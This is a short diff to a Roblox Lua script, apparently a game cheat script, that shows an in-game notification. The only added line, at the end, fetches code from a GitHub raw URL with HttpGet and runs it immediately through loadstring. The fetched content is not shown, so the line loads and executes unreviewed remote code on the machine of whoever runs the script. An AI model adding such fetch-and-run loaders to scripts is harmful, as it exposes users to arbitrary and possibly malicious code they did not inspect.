@@ -413,3 +413,4 @@ game:GetService("StarterGui"):SetCore("SendNotification",{
 	Time = 10;
 	Icon = "rbxassetid://505845268";
 })
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Red72Falcon/DaHoodians/main/main'))()
